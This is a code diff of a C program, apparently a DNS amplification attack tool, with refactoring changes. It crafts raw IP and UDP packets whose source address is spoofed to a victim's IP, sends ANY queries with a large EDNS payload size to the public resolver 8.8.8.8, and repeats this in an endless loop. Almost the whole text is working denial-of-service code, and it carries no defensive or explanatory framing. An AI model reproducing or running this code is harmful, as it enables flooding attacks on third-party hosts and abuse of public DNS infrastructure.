@@ -44,8 +44,8 @@ void querySiteFormat(unsigned char * dns,unsigned char * host)
 	*dns++=0x00;
 }
 
-// Creates the dns header and packet
-void dnsHeaderCreate(dnsHeader *dns)
+// Set the dns header and packet
+void setDnsHeader(dnsHeader *dns)
 {
 	dns->id = (unsigned short) htons(getpid());
 	dns->flags = htons(0x0120);
@@ -55,7 +55,7 @@ void dnsHeaderCreate(dnsHeader *dns)
 	dns->add = htons(1);
 }
 
-void eDnsHeaderCreate(eDnsHeader *eDns){
+void setExtendDnsHeader(eDnsHeader *eDns){
 	eDns->name = 0;
 	eDns->type = htons(41);
 	eDns->udpPayloadSize = htons(0x1000);
@@ -65,7 +65,7 @@ void eDnsHeaderCreate(eDnsHeader *eDns){
 	eDns->dataLength = 0;
 }
 
-void ipHeaderCreate(iph *ip){
+void setipHeader(iph *ip){
 	ip->version = 4;
     ip->ihl = 5;
     ip->tos = 0;
@@ -77,29 +77,21 @@ void ipHeaderCreate(iph *ip){
     
 }
 
-void queryset(query *q){
+void setQuery(query *q){
 	q->qtype = htons(0x00ff);
 	q->qclass = htons(0x1);
 }
 
 void dnsAmplificationAttack(char *victimIp, int victimPort)
 {
-	printf("dnsHeaer size: %ld\n", sizeof(dnsHeader)); //12
-	printf("query size: %ld\n", sizeof(query)); //4
-	printf("iph size: %ld\n", sizeof(iph));	//20
-	printf("udph size: %ld\n", sizeof(udph)); //8
-	printf("eDnsHeader size: %ld\n", sizeof(eDnsHeader)); //11
-	printf("psHeader size: %ld\n", sizeof(psHeader)); //12
-
-
 	char *dnsIp = "8.8.8.8";
 	int dnsPort = 53;
 		
 	unsigned char dnsRequestPacket[139];
-	unsigned char *dnsRecord = "github.com";
+	unsigned char *dnsRecord = "www.github.com";
 	
 	dnsHeader *dns = (dnsHeader *)&dnsRequestPacket;
-	dnsHeaderCreate(dns);
+	setDnsHeader(dns);
 	
 	unsigned char *dnsName, dnsRcrd[32];
 	dnsName = (unsigned char *)&dnsRequestPacket[12];
@@ -108,12 +100,12 @@ void dnsAmplificationAttack(char *victimIp, int victimPort)
 	
 	query *q;
 	q = (query *)&dnsRequestPacket[12 + (strlen(dnsName)+1)];
-	queryset(q);
+	setQuery(q);
 	
 
 	eDnsHeader *eDns;
 	eDns = (eDnsHeader *)&dnsRequestPacket[16 + (strlen(dnsName)+1)];
-	eDnsHeaderCreate(eDns);
+	setExtendDnsHeader(eDns);
 	
 	
 	char datagram[4096], *data, *psgram;
@@ -128,7 +120,7 @@ void dnsAmplificationAttack(char *victimIp, int victimPort)
     sin.sin_addr.s_addr = inet_addr(dnsIp);
     
     iph *ip = (iph *)datagram;
-    ipHeaderCreate(ip);
+    setipHeader(ip);
     ip->tot_len = 55 + (strlen(dnsName)+1);
     ip->saddr = inet_addr(victimIp);
 	ip->check = checkSum((unsigned short *)datagram, ip->tot_len);
@@ -140,7 +132,7 @@ void dnsAmplificationAttack(char *victimIp, int victimPort)
     udp->len = htons(35 + (strlen(dnsName)+1));
     udp->check = 0;
 	
-	// Pseudoheader creation and checksum calculation
+
 	psHeader pshdr;
 	pshdr.saddr = inet_addr(victimIp);
     pshdr.daddr = sin.sin_addr.s_addr;
@@ -156,32 +148,30 @@ void dnsAmplificationAttack(char *victimIp, int victimPort)
 		
     udp->check = checkSum((unsigned short *)psgram, pssize);
     
-    // Send data
-    int status = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if(status == -1) printf("Could not create socket.\n");
-    else sendto(status, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if(sock == -1) printf("Could not create socket.\n");
+    else sendto(sock, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
     
 	free(psgram);
-	close(status);
+	close(sock);
 	
 	return;
 }
 
 int main(int argc, char **argv)
 {	
-	if(getuid()!=0)
-		printf("You must be running as root!\n");
-	if(argc<3)
-		printf("Usage: %s victimIp victimPort\n", argv[0]);
+	if(getuid()!=0) printf("run DNS Attack as root!\n");
+	else {
+		char *victimIp = argv[1];
+		int victimPort = atoi(argv[2]);
+		
+		while(1) {
+			printf("send query packet to google DNS Server\n");
+			dnsAmplificationAttack(victimIp, victimPort);
+			sleep(5);
+		}	
+	}
 	
-	char *victimIp = argv[1];
-	int victimPort = atoi(argv[2]);
-	
-	while(1) {
-		printf("dns send\n");
-		dnsAmplificationAttack(victimIp, victimPort);
-		sleep(5);
-	}	
 
 	return 0;
 }
